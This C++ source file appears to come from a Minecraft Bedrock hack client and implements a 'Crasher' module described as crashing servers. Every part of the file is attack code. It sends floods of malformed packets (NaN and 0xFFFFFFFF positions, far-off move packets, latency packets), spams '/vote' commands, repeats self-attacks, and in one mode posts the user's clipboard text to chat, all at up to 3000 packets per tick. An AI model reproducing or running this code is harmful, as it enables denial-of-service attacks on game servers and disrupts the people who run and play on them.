#include "Crasher.h"
#include "../pch.h"

using namespace std;
Crasher::Crasher() : IModule(0, Category::UNUSED, "Crashes servers") {
	registerIntSetting("Packets", &pps, 1, 1, 3000);
	registerEnumSetting("Mode", &mode, 0);
	mode.addEntry("Realms", 0);
	mode.addEntry("Invalid", 1);
	mode.addEntry("VoteSpam", 2);
	mode.addEntry("Clipboard", 3);
	mode.addEntry("SelfHit", 4);
	mode.addEntry("All", 5);
}

const char* Crasher::getRawModuleName() {
	return "Crasher";
}

const char* Crasher::getModuleName() {
	if (mode.getSelectedValue() == 0) name = string("Crasher ") + string(GRAY) + string("[") + string(WHITE) + string("Realm") + string(GRAY) + string("]");
	if (mode.getSelectedValue() == 1) name = string("Crasher ") + string(GRAY) + string("[") + string(WHITE) + string("Invalid") + string(GRAY) + string("]");
	if (mode.getSelectedValue() == 2) name = string("Crasher ") + string(GRAY) + string("[") + string(WHITE) + string("VoteSpam") + string(GRAY) + string("]");
	if (mode.getSelectedValue() == 3) name = string("Crasher ") + string(GRAY) + string("[") + string(WHITE) + string("Clipboard") + string(GRAY) + string("]");
	if (mode.getSelectedValue() == 4) name = string("Crasher ") + string(GRAY) + string("[") + string(WHITE) + string("SelfHit") + string(GRAY) + string("]");
	if (mode.getSelectedValue() == 5) name = string("Crasher ") + string(GRAY) + string("[") + string(WHITE) + string("All") + string(GRAY) + string("]");
	return name.c_str();
}

void Crasher::onEnable() {
	auto player = g_Data.getLocalPlayer();
	if (player == nullptr) setEnabled(false);

	tick = 0;
}

void Crasher::onTick(C_GameMode* gm) {
	auto player = g_Data.getLocalPlayer();
	if (player == nullptr) return;
	tick++;

	C_TextPacket textPacket;
	C_MovePlayerPacket MovePlayerPacket(player, player->getPos()->add(vec3_t(1000.5f, 1000.5f, 1000.5f)));
	NetworkLatencyPacket NetworkPacket;
	NetworkPacket.timeStamp = 6;

	switch (mode.getSelectedValue()) {
	case 1: // Invalid
		for (int i = 0; i < pps; i++) {
			player->causeFallDamage(0);
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&MovePlayerPacket);
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&NetworkPacket);
		}
		break;
	case 2: // VoteSpam
		for (int i = 0; i < pps; i++) {
			textPacket.message.setText("./vote");
			textPacket.messageType = 3;
			textPacket.sourceName.setText(player->getNameTag()->getText());
			textPacket.xboxUserId = to_string(player->getUserId());
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&textPacket);
		}
		break;
	case 3: // ClipboardSpam
		for (int i = 0; i < pps; i++) {
			textPacket.message.setText(Utils::getClipboardText());
			textPacket.sourceName.setText(player->getNameTag()->getText());
			textPacket.xboxUserId = to_string(player->getUserId());
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&textPacket);
		}
		break;
	case 4: // SelfHit
		//gm->player->swing();
		for (int i = 0; i < pps; i++) {
			g_Data.getCGameMode()->attack(gm->player);
		}
		break;
	case 5:
		for (int i = 0; i < pps; i++) {
			player->causeFallDamage(0);
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&MovePlayerPacket);
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&NetworkPacket);
			switch (tick) {
			case 1:
				textPacket.message.setText("./vote");
				textPacket.messageType = 3;
				break;
			case 2:
				textPacket.message.setText(Utils::getClipboardText());
				break;
			case 3:
				tick = 0;
				break;
			}
			player->swing();
			g_Data.getCGameMode()->attack(player);
			textPacket.sourceName.setText(player->getNameTag()->getText());
			textPacket.xboxUserId = to_string(player->getUserId());
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&textPacket);
		}
		break;
	}
}

void Crasher::onSendPacket(C_Packet* packet) {
	auto player = g_Data.getLocalPlayer();
	if (player == nullptr) return;

	if (packet->isInstanceOf<PlayerAuthInputPacket>()) {
		PlayerAuthInputPacket* InputPacket = reinterpret_cast<PlayerAuthInputPacket*>(packet);
		switch (mode.getSelectedValue()) {
		case 0: // Realms
			InputPacket->pos.x = static_cast<float>(0xFFFFFFFF);
			InputPacket->pos.y = static_cast<float>(0xFFFFFFFF);
			InputPacket->pos.z = static_cast<float>(0xFFFFFFFF);
			break;
		case 1: // Invalid
			InputPacket->pos.x = NAN;
			InputPacket->pos.y = NAN;
			InputPacket->pos.z = NAN;
			break;
		case 5: // All
			switch (tick) {
			case 1:
				InputPacket->pos.x = static_cast<float>(0xFFFFFFFF);
				InputPacket->pos.y = static_cast<float>(0xFFFFFFFF);
				InputPacket->pos.z = static_cast<float>(0xFFFFFFFF);
				break;
			case 2:
				InputPacket->pos.x = NAN;
				InputPacket->pos.y = NAN;
				InputPacket->pos.z = NAN;
				break;
			}
			break;
		}

		// All
		if (mode.getSelectedValue() == 5) {
		}
	}
	else if (packet->isInstanceOf<C_MovePlayerPacket>()) {
		C_MovePlayerPacket* movePacket = reinterpret_cast<C_MovePlayerPacket*>(packet);
		switch (mode.getSelectedValue()) {
		case 0: // Realms
			movePacket->Position.x = static_cast<float>(0xFFFFFFFF);
			movePacket->Position.y = static_cast<float>(0xFFFFFFFF);
			movePacket->Position.z = static_cast<float>(0xFFFFFFFF);
			break;
		case 1: // Invalid
			movePacket->Position.x = NAN;
			movePacket->Position.y = NAN;
			movePacket->Position.z = NAN;
			break;
		case 5: // All
			switch (tick) {
			case 1:
				movePacket->Position.x = static_cast<float>(0xFFFFFFFF);
				movePacket->Position.y = static_cast<float>(0xFFFFFFFF);
				movePacket->Position.z = static_cast<float>(0xFFFFFFFF);
				break;
			case 2:
				movePacket->Position.x = NAN;
				movePacket->Position.y = NAN;
				movePacket->Position.z = NAN;
				break;
			}
			break;
		}
	}
}